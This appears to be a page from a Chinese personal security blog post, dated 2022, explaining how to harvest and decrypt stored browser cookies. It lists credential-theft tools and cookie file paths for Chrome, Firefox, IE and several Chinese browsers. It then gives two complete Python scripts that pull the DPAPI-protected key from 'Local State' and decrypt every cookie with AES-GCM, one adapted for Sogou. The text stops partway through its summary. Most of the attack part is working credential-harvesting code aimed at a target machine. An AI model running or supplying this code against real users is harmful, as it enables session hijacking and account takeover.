@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="Just Abandon">
+    <meta name="description" content="解密浏览器cookie 由于非主流浏览器的cookie常用工具无法抓取cookie所记.
+常用抓取浏览器凭证工具: HackBrowserData,sharpchrome.
+1.cookie抓取原理 cookie 只是浏览器凭证的一种,浏览器存储的 cookie,历史记录,已保存的密码,书签 等等都存储在本地文件中,理论上来说只要查找到存放文件的位置即可看见存储的数据,不过该文件部分数据不以明文显示以及各个浏览器存放文件的位置不同导致一些非主流的浏览器不在常用凭证获取工具之内.本文仅以cookie做示范.
+2.步骤 chrome用户数据文件默认存放在: C:\Users\用户名\AppData\Local\Google\Chrome\User Data,其中有一个关键文件是 &ldquo;Local State&rdquo;,该文件 encrypted_key 字段存放chrome凭证加密的密钥. 以下用搜狗浏览器文件为例,搜狗浏览器采用chrome内核,凭证文件存放结构相似:
+Locat State 存放在: &ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Local State&rdquo; cookie 存放在:&ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies&rdquo; IE浏览器Cookie数据位于：%APPDATA%\Microsoft\Windows\Cookies\ 目录中的xxx.txt文件 （里面可能有很多个.txt Cookie文件）如：C:\Users\yren9\AppData\Roaming\Microsoft\Windows\Cookies\0WQ6YROK.txt 在IE浏览器中，IE将各个站点的Cookie分别保存为一个XXX.txt这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而Firefox和Chrome是将所有的Cookie都保存在一个文件中（文件大小较大），该文件的格式为SQLite3数据库格式的文件。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\ji4grfex.default\cookies.sqlite在Firefox中查看cookie, 可以选择”工具 &gt; 选项 &gt;” “隐私 &gt; 显示cookie”。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite Chrome的Cookie数据位于：%LOCALAPPDATA%\Google\Chrome\User Data\Default\ 目录中，名为Cookies的文件。如：C:\Users\jay\AppData\Local\Google\Chrome\User Data\Default\CookiesC:\Users\Andy\AppData\Local\Google\Chrome\User Data\Default\Cookies 在Linux系统上（以Ubuntu 12.04 和 RHEL6.x 为例）浏览器的CookieFirefox的Cookie路径为：$HOME/.mozilla/firefox/xxxx.default/目录下的cookie.sqlite文件。 寰宇浏览器：C:\Users\Andy\AppData\Local\ ==== %LOCALAPPDATA%%LOCALAPPDATA%\QupZilla\profiles\default\Cookies QQ浏览器：C:\Users\Andy\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Cookies 360安全浏览器：C:\Users\Andy\AppData\Roaming\360se6\User Data\Default\Cookies %APPDATA%\360se6\User Data\Default\Cookies 360极速浏览器：C:\Users\Andy\AppData\Local\360Chrome\Chrome\User Data\Default\Cookies %LOCALAPPDATA%\360Chrome\Chrome\User Data\Default\Cookies 搜狗浏览器：C:\Users\Andy\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies %APPDATA%\SogouExplorer\Webkit\Default\Cookies 2345浏览器：C:\Users\Andy\AppData\Local\2345Explorer\User Data\Default %LOCALAPPDATA%\2345Explorer\User Data\Default\CookiesV3 各种浏览器的凭证文件位置大部分取决于内核,同样使用chrome内核的 360safe browser,qq browser,都差不多,其加密方式也一样 由于每台计算机都有自己的本地加密密钥，因此，只有对数据进行加密的计算机才能对其进行解密,将目标凭证文件放到本机上执行解密是不可的">
+    <meta name="keywords" content="blog,developer,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="decrypt browser cookie"/>
+<meta name="twitter:description" content="解密浏览器cookie 由于非主流浏览器的cookie常用工具无法抓取cookie所记.
+常用抓取浏览器凭证工具: HackBrowserData,sharpchrome.
+1.cookie抓取原理 cookie 只是浏览器凭证的一种,浏览器存储的 cookie,历史记录,已保存的密码,书签 等等都存储在本地文件中,理论上来说只要查找到存放文件的位置即可看见存储的数据,不过该文件部分数据不以明文显示以及各个浏览器存放文件的位置不同导致一些非主流的浏览器不在常用凭证获取工具之内.本文仅以cookie做示范.
+2.步骤 chrome用户数据文件默认存放在: C:\Users\用户名\AppData\Local\Google\Chrome\User Data,其中有一个关键文件是 &ldquo;Local State&rdquo;,该文件 encrypted_key 字段存放chrome凭证加密的密钥. 以下用搜狗浏览器文件为例,搜狗浏览器采用chrome内核,凭证文件存放结构相似:
+Locat State 存放在: &ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Local State&rdquo; cookie 存放在:&ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies&rdquo; IE浏览器Cookie数据位于：%APPDATA%\Microsoft\Windows\Cookies\ 目录中的xxx.txt文件 （里面可能有很多个.txt Cookie文件）如：C:\Users\yren9\AppData\Roaming\Microsoft\Windows\Cookies\0WQ6YROK.txt 在IE浏览器中，IE将各个站点的Cookie分别保存为一个XXX.txt这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而Firefox和Chrome是将所有的Cookie都保存在一个文件中（文件大小较大），该文件的格式为SQLite3数据库格式的文件。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\ji4grfex.default\cookies.sqlite在Firefox中查看cookie, 可以选择”工具 &gt; 选项 &gt;” “隐私 &gt; 显示cookie”。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite Chrome的Cookie数据位于：%LOCALAPPDATA%\Google\Chrome\User Data\Default\ 目录中，名为Cookies的文件。如：C:\Users\jay\AppData\Local\Google\Chrome\User Data\Default\CookiesC:\Users\Andy\AppData\Local\Google\Chrome\User Data\Default\Cookies 在Linux系统上（以Ubuntu 12.04 和 RHEL6.x 为例）浏览器的CookieFirefox的Cookie路径为：$HOME/.mozilla/firefox/xxxx.default/目录下的cookie.sqlite文件。 寰宇浏览器：C:\Users\Andy\AppData\Local\ ==== %LOCALAPPDATA%%LOCALAPPDATA%\QupZilla\profiles\default\Cookies QQ浏览器：C:\Users\Andy\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Cookies 360安全浏览器：C:\Users\Andy\AppData\Roaming\360se6\User Data\Default\Cookies %APPDATA%\360se6\User Data\Default\Cookies 360极速浏览器：C:\Users\Andy\AppData\Local\360Chrome\Chrome\User Data\Default\Cookies %LOCALAPPDATA%\360Chrome\Chrome\User Data\Default\Cookies 搜狗浏览器：C:\Users\Andy\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies %APPDATA%\SogouExplorer\Webkit\Default\Cookies 2345浏览器：C:\Users\Andy\AppData\Local\2345Explorer\User Data\Default %LOCALAPPDATA%\2345Explorer\User Data\Default\CookiesV3 各种浏览器的凭证文件位置大部分取决于内核,同样使用chrome内核的 360safe browser,qq browser,都差不多,其加密方式也一样 由于每台计算机都有自己的本地加密密钥，因此，只有对数据进行加密的计算机才能对其进行解密,将目标凭证文件放到本机上执行解密是不可的"/>
+
+    <meta property="og:title" content="decrypt browser cookie" />
+<meta property="og:description" content="解密浏览器cookie 由于非主流浏览器的cookie常用工具无法抓取cookie所记.
+常用抓取浏览器凭证工具: HackBrowserData,sharpchrome.
+1.cookie抓取原理 cookie 只是浏览器凭证的一种,浏览器存储的 cookie,历史记录,已保存的密码,书签 等等都存储在本地文件中,理论上来说只要查找到存放文件的位置即可看见存储的数据,不过该文件部分数据不以明文显示以及各个浏览器存放文件的位置不同导致一些非主流的浏览器不在常用凭证获取工具之内.本文仅以cookie做示范.
+2.步骤 chrome用户数据文件默认存放在: C:\Users\用户名\AppData\Local\Google\Chrome\User Data,其中有一个关键文件是 &ldquo;Local State&rdquo;,该文件 encrypted_key 字段存放chrome凭证加密的密钥. 以下用搜狗浏览器文件为例,搜狗浏览器采用chrome内核,凭证文件存放结构相似:
+Locat State 存放在: &ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Local State&rdquo; cookie 存放在:&ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies&rdquo; IE浏览器Cookie数据位于：%APPDATA%\Microsoft\Windows\Cookies\ 目录中的xxx.txt文件 （里面可能有很多个.txt Cookie文件）如：C:\Users\yren9\AppData\Roaming\Microsoft\Windows\Cookies\0WQ6YROK.txt 在IE浏览器中，IE将各个站点的Cookie分别保存为一个XXX.txt这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而Firefox和Chrome是将所有的Cookie都保存在一个文件中（文件大小较大），该文件的格式为SQLite3数据库格式的文件。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\ji4grfex.default\cookies.sqlite在Firefox中查看cookie, 可以选择”工具 &gt; 选项 &gt;” “隐私 &gt; 显示cookie”。 Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite Chrome的Cookie数据位于：%LOCALAPPDATA%\Google\Chrome\User Data\Default\ 目录中，名为Cookies的文件。如：C:\Users\jay\AppData\Local\Google\Chrome\User Data\Default\CookiesC:\Users\Andy\AppData\Local\Google\Chrome\User Data\Default\Cookies 在Linux系统上（以Ubuntu 12.04 和 RHEL6.x 为例）浏览器的CookieFirefox的Cookie路径为：$HOME/.mozilla/firefox/xxxx.default/目录下的cookie.sqlite文件。 寰宇浏览器：C:\Users\Andy\AppData\Local\ ==== %LOCALAPPDATA%%LOCALAPPDATA%\QupZilla\profiles\default\Cookies QQ浏览器：C:\Users\Andy\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Cookies 360安全浏览器：C:\Users\Andy\AppData\Roaming\360se6\User Data\Default\Cookies %APPDATA%\360se6\User Data\Default\Cookies 360极速浏览器：C:\Users\Andy\AppData\Local\360Chrome\Chrome\User Data\Default\Cookies %LOCALAPPDATA%\360Chrome\Chrome\User Data\Default\Cookies 搜狗浏览器：C:\Users\Andy\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies %APPDATA%\SogouExplorer\Webkit\Default\Cookies 2345浏览器：C:\Users\Andy\AppData\Local\2345Explorer\User Data\Default %LOCALAPPDATA%\2345Explorer\User Data\Default\CookiesV3 各种浏览器的凭证文件位置大部分取决于内核,同样使用chrome内核的 360safe browser,qq browser,都差不多,其加密方式也一样 由于每台计算机都有自己的本地加密密钥，因此，只有对数据进行加密的计算机才能对其进行解密,将目标凭证文件放到本机上执行解密是不可的" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://justabandon.github.io/posts/decrypt_browser_cookie/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-25T13:37:53+08:00" />
+<meta property="article:modified_time" content="2022-07-25T13:37:53+08:00" />
+
+
+
+    <title>
+  decrypt browser cookie · record and share
+</title>
+
+    
+      <link rel="canonical" href="https://justabandon.github.io/posts/decrypt_browser_cookie/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.728f45c9eaff821acb9cccdb60c81cf16be81bd890ee22cc5b5f4dbf276a082f.css" integrity="sha256-co9Fyer/ghrLnMzbYMgc8WvoG9iQ7iLMW19NvydqCC8=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css" integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.101.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-auto">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      record and share
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/chat/">Chat</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/images/">Images</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://justabandon.github.io/posts/decrypt_browser_cookie/">
+              decrypt browser cookie
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-07-25T13:37:53&#43;08:00">
+                July 25, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <hr>
+<h1 id="解密浏览器cookie">
+  解密浏览器cookie
+  <a class="heading-link" href="#%e8%a7%a3%e5%af%86%e6%b5%8f%e8%a7%88%e5%99%a8cookie">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p><strong>由于非主流浏览器的cookie常用工具无法抓取cookie所记.</strong></p>
+<p><strong>常用抓取浏览器凭证工具:</strong> <a href="https://github.com/Aquilao/HackBrowserData%5D">HackBrowserData</a>,<a href="https://github.com/GhostPack/SharpDPAPI">sharpchrome</a>.</p>
+<hr>
+<h2 id="1cookie抓取原理">
+  1.cookie抓取原理
+  <a class="heading-link" href="#1cookie%e6%8a%93%e5%8f%96%e5%8e%9f%e7%90%86">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>cookie 只是浏览器凭证的一种,浏览器存储的 cookie,历史记录,已保存的密码,书签 等等都存储在本地文件中,理论上来说只要查找到存放文件的位置即可看见存储的数据,不过该文件部分数据不以明文显示以及各个浏览器存放文件的位置不同导致一些非主流的浏览器不在常用凭证获取工具之内.本文仅以cookie做示范.</p>
+<h2 id="2步骤">
+  2.步骤
+  <a class="heading-link" href="#2%e6%ad%a5%e9%aa%a4">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>chrome用户数据文件默认存放在: <strong>C:\Users\用户名\AppData\Local\Google\Chrome\User Data</strong>,其中有一个关键文件是 &ldquo;Local State&rdquo;,该文件 encrypted_key 字段存放chrome凭证加密的密钥.
+以下用搜狗浏览器文件为例,搜狗浏览器采用chrome内核,凭证文件存放结构相似:</p>
+<ul>
+<li>Locat State 存放在: &ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Local State&rdquo;</li>
+<li>cookie 存放在:&ldquo;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies&rdquo;</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>IE浏览器Cookie数据位于：%APPDATA%\Microsoft\Windows\Cookies\ 目录中的xxx.txt文件 （里面可能有很多个.txt Cookie文件）如：C:\Users\yren9\AppData\Roaming\Microsoft\Windows\Cookies\0WQ6YROK.txt
+</span></span><span style="display:flex;"><span>在IE浏览器中，IE将各个站点的Cookie分别保存为一个XXX.txt这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而Firefox和Chrome是将所有的Cookie都保存在一个文件中（文件大小较大），该文件的格式为SQLite3数据库格式的文件。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\ji4grfex.default\cookies.sqlite在Firefox中查看cookie, 可以选择”工具 &gt; 选项 &gt;” “隐私 &gt; 显示cookie”。
+</span></span><span style="display:flex;"><span>Firefox的Cookie数据位于：%APPDATA%\Mozilla\Firefox\Profiles\ 目录中的xxx.default目录，名为cookies.sqlite的文件。如：C:\Users\jay\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Chrome的Cookie数据位于：%LOCALAPPDATA%\Google\Chrome\User Data\Default\ 目录中，名为Cookies的文件。如：C:\Users\jay\AppData\Local\Google\Chrome\User Data\Default\CookiesC:\Users\Andy\AppData\Local\Google\Chrome\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>在Linux系统上（以Ubuntu 12.04 和 RHEL6.x 为例）浏览器的CookieFirefox的Cookie路径为：$HOME/.mozilla/firefox/xxxx.default/目录下的cookie.sqlite文件。
+</span></span><span style="display:flex;"><span>寰宇浏览器：C:\Users\Andy\AppData\Local\ ====   %LOCALAPPDATA%%LOCALAPPDATA%\QupZilla\profiles\default\Cookies
+</span></span><span style="display:flex;"><span>QQ浏览器：C:\Users\Andy\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>%LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>360安全浏览器：C:\Users\Andy\AppData\Roaming\360se6\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>%APPDATA%\360se6\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>360极速浏览器：C:\Users\Andy\AppData\Local\360Chrome\Chrome\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>%LOCALAPPDATA%\360Chrome\Chrome\User Data\Default\Cookies
+</span></span><span style="display:flex;"><span>搜狗浏览器：C:\Users\Andy\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies
+</span></span><span style="display:flex;"><span>%APPDATA%\SogouExplorer\Webkit\Default\Cookies
+</span></span><span style="display:flex;"><span>2345浏览器：C:\Users\Andy\AppData\Local\2345Explorer\User Data\Default
+</span></span><span style="display:flex;"><span>%LOCALAPPDATA%\2345Explorer\User Data\Default\CookiesV3
+</span></span></code></pre></div><p><strong>各种浏览器的凭证文件位置大部分取决于内核,同样使用chrome内核的 360safe browser,qq browser,都差不多,其加密方式也一样</strong>
+<strong>由于每台计算机都有自己的本地加密密钥，因此，只有对数据进行加密的计算机才能对其进行解密,将目标凭证文件放到本机上执行解密是不可的</strong></p>
+<p>Cookies 文件为sql存放的单数据库文件,使用navicat即可查看</p>
+<p><img src="/images/decrypt_browser_cookie/navicat_cookies.png" alt="cookies_sql"></p>
+<p>加密的cookie数据存放在encrypted_key字段:
+<img src="/images/decrypt_browser_cookie/navicat_cookies2.png" alt="encrypted_key"></p>
+<p>前缀v10为当前版本的加密方法,还有v11 以及没有前缀的加密方式</p>
+<p>github chrome解密代码 <img src="https://gist.github.com/GramThanos/ff2c42bb961b68e7cc197d6685e06f10" alt="decryptchromecookies.py">:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Based on:
+</span></span><span style="display:flex;"><span># 	https://gist.github.com/DakuTree/98c8362fb424351b803e
+</span></span><span style="display:flex;"><span># 	https://gist.github.com/jordan-wright/5770442
+</span></span><span style="display:flex;"><span># 	https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
+</span></span><span style="display:flex;"><span># 	https://stackoverflow.com/questions/60416350/chrome-80-how-to-decode-cookies
+</span></span><span style="display:flex;"><span># 	https://stackoverflow.com/questions/43987779/python-module-crypto-cipher-aes-has-no-attribute-mode-ccm-even-though-pycry
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import json
+</span></span><span style="display:flex;"><span>import base64
+</span></span><span style="display:flex;"><span>import sqlite3
+</span></span><span style="display:flex;"><span>from shutil import copyfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># python.exe -m pip install pypiwin32
+</span></span><span style="display:flex;"><span>import win32crypt
+</span></span><span style="display:flex;"><span># python.exe -m pip install pycryptodomex
+</span></span><span style="display:flex;"><span>from Cryptodome.Cipher import AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Copy Cookies and Local State to current folder
+</span></span><span style="display:flex;"><span>copyfile(os.getenv(&#34;APPDATA&#34;) + &#34;/../Local/Google/Chrome/User Data/Default/Cookies&#34;, &#39;./Cookies&#39;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Load encryption key
+</span></span><span style="display:flex;"><span>encrypted_key = None
+</span></span><span style="display:flex;"><span>with open(os.getenv(&#34;APPDATA&#34;) + &#34;/../Local/Google/Chrome/User Data/Local State&#34;, &#39;r&#39;) as file:
+</span></span><span style="display:flex;"><span>	encrypted_key = json.loads(file.read())[&#39;os_crypt&#39;][&#39;encrypted_key&#39;]
+</span></span><span style="display:flex;"><span>encrypted_key = base64.b64decode(encrypted_key)
+</span></span><span style="display:flex;"><span>encrypted_key = encrypted_key[5:]
+</span></span><span style="display:flex;"><span>decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Connect to the Database
+</span></span><span style="display:flex;"><span>conn = sqlite3.connect(&#39;./Cookies&#39;)
+</span></span><span style="display:flex;"><span>cursor = conn.cursor()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Get the results
+</span></span><span style="display:flex;"><span>cursor.execute(&#39;SELECT host_key, name, value, encrypted_value FROM cookies&#39;)
+</span></span><span style="display:flex;"><span>for host_key, name, value, encrypted_value in cursor.fetchall():
+</span></span><span style="display:flex;"><span>	# Decrypt the encrypted_value
+</span></span><span style="display:flex;"><span>	try:
+</span></span><span style="display:flex;"><span>		# Try to decrypt as AES (2020 method)
+</span></span><span style="display:flex;"><span>		cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
+</span></span><span style="display:flex;"><span>		decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
+</span></span><span style="display:flex;"><span>	except:
+</span></span><span style="display:flex;"><span>		# If failed try with the old method
+</span></span><span style="display:flex;"><span>		decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(&#39;utf-8&#39;) or value or 0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	# Update the cookies with the decrypted value
+</span></span><span style="display:flex;"><span>	# This also makes all session cookies persistent
+</span></span><span style="display:flex;"><span>	cursor.execute(&#39;\
+</span></span><span style="display:flex;"><span>		UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
+</span></span><span style="display:flex;"><span>		WHERE host_key = ?\
+</span></span><span style="display:flex;"><span>		AND name = ?&#39;,
+</span></span><span style="display:flex;"><span>		(decrypted_value, host_key, name));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn.commit()
+</span></span><span style="display:flex;"><span>conn.close()
+</span></span></code></pre></div><p>搜狗浏览器稍加更改即可使用(Crypto.Cipher 使用 pip install pycryptodome 即可):</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import json
+</span></span><span style="display:flex;"><span>import base64
+</span></span><span style="display:flex;"><span>import sqlite3
+</span></span><span style="display:flex;"><span>from shutil import copyfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># python.exe -m pip install pypiwin32
+</span></span><span style="display:flex;"><span>import win32crypt
+</span></span><span style="display:flex;"><span># python.exe -m pip install pycryptodomex
+</span></span><span style="display:flex;"><span>from Crypto.Cipher import AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>copyfile(r&#34;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Default\Cookies&#34;, &#39;./Cookies&#39;)
+</span></span><span style="display:flex;"><span>copyfile(r&#34;C:\Users\用户名\AppData\Roaming\SogouExplorer\Webkit\Local State&#34;, &#39;./Local State&#39;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encrypted_key = None
+</span></span><span style="display:flex;"><span>with open(&#34;./Local State&#34;, &#39;r&#39;) as file:
+</span></span><span style="display:flex;"><span>	encrypted_key = json.loads(file.read())[&#39;os_crypt&#39;][&#39;encrypted_key&#39;]
+</span></span><span style="display:flex;"><span>encrypted_key = base64.b64decode(encrypted_key)
+</span></span><span style="display:flex;"><span>encrypted_key = encrypted_key[5:]
+</span></span><span style="display:flex;"><span>decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Connect to the Database
+</span></span><span style="display:flex;"><span>conn = sqlite3.connect(&#39;./Cookies&#39;)
+</span></span><span style="display:flex;"><span>cursor = conn.cursor()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Get the results
+</span></span><span style="display:flex;"><span>cursor.execute(&#39;SELECT host_key, name, value, encrypted_value FROM cookies&#39;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>for host_key, name, value, encrypted_value in cursor.fetchall():
+</span></span><span style="display:flex;"><span>	# Decrypt the encrypted_value
+</span></span><span style="display:flex;"><span>	try:
+</span></span><span style="display:flex;"><span>		# Try to decrypt as AES (2020 method)
+</span></span><span style="display:flex;"><span>		cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
+</span></span><span style="display:flex;"><span>		decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
+</span></span><span style="display:flex;"><span>	except:
+</span></span><span style="display:flex;"><span>		# If failed try with the old method
+</span></span><span style="display:flex;"><span>		decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(&#39;utf-8&#39;) or value or 0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	# Update the cookies with the decrypted value
+</span></span><span style="display:flex;"><span>	# This also makes all session cookies persistent
+</span></span><span style="display:flex;"><span>	cursor.execute(&#39;\
+</span></span><span style="display:flex;"><span>		UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
+</span></span><span style="display:flex;"><span>		WHERE host_key = ?\
+</span></span><span style="display:flex;"><span>		AND name = ?&#39;,
+</span></span><span style="display:flex;"><span>		(decrypted_value, host_key, name));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn.commit()
+</span></span><span style="display:flex;"><span>conn.close()
+</span></span></code></pre></div><p>关键代码:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
+</span></span><span style="display:flex;"><span>decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
+</span></span></code></pre></div><hr>
+<h2 id="3-总结">
+  3. 总结
+  <a class="heading-link" href="#3-%e6%80%bb%e7%bb%93">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>代码懒得深究,不变的方式还是那样,凭证存储在本地,有加密就会有解密,根据对应的加密方式进行解密,对于浏览器凭证有几个关键点</p>
+<blockquote>
+<p>文件解密最好拷贝到当前目录下进行解密,浏览器运行时进行解密可能会有占用等其他想不到的问题.</p>
